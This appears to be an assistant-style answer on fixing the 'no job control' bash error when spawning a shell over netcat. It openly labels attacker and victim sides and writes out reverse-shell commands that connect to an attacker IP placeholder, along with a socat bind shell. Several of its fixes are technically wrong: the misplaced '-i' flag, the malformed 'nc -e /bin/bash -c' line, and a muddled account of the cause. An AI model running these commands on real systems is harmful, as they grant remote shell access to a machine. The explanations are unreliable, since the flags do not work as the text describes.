The error message you are seeing:

```
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
```

occurs because `bash` is trying to manage terminal job control, but `nc` (netcat) doesn't allocate a terminal for the shell in the way that a typical interactive session would. In this context, when you run `nc` in "listening" mode (`nc -lvnp 4444`), it opens a socket and listens for incoming connections. However, it doesn't create a proper terminal session for the shell you're spawning (in this case, `bash`).

This issue typically happens in environments where you are trying to establish an interactive session via `netcat`, but `bash` is expecting a controlling terminal, which isn't available.

### Solutions

#### 1. **Using `bash` with `-i` for an Interactive Shell**
You can force `bash` to run interactively by using the `-i` flag, which will enable job control even though the shell isn't connected to a terminal.

On the **attacker**/client side, this would look like:

```bash
nc -lvnp 4444
```

And on the **victim**/target side, you would adjust the `bash` invocation to be interactive by adding the `-i` flag:

```bash
nc <attacker_ip> 4444 -e /bin/bash -i
```

The `-i` flag tells `bash` to treat the shell as an interactive one, and it should resolve the `Inappropriate ioctl for device` issue.

#### 2. **Avoiding the Use of `bash` in a Container**
Another option is to use a non-interactive shell or command that doesn't attempt job control. Instead of `bash`, you could use `sh` (which doesn't require a controlling terminal):

```bash
nc <attacker_ip> 4444 -e /bin/sh
```

This will avoid the `bash` job control issues because `sh` does not expect a terminal for job management.

#### 3. **Using `socat` as an Alternative to `nc`**
In some cases, `socat` (a more versatile tool) can be used instead of `nc`, which might avoid terminal issues:

```bash
socat TCP4-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

This setup with `socat` might behave more predictably with shell spawning in containerized environments.

#### 4. **Disabling Job Control in Bash**
If you still prefer to use `bash`, you can run `bash` with job control disabled by using the `+m` option to disable job control, or simply by running a non-interactive shell. For example:

```bash
nc <attacker_ip> 4444 -e /bin/bash -c 'set +m; exec /bin/bash'
```

Here, `set +m` disables job control inside the shell, and `exec /bin/bash` runs `bash` without trying to manage terminal processes.

### Conclusion
To fix the `bash: cannot set terminal process group` error in a Dockerized environment:

1. **Use `bash -i`** on the target side to ensure it runs interactively.
2. Alternatively, use `sh` instead of `bash` for non-interactive shells.
3. Consider using **`socat`** if `nc` doesn't work well in your specific setup.
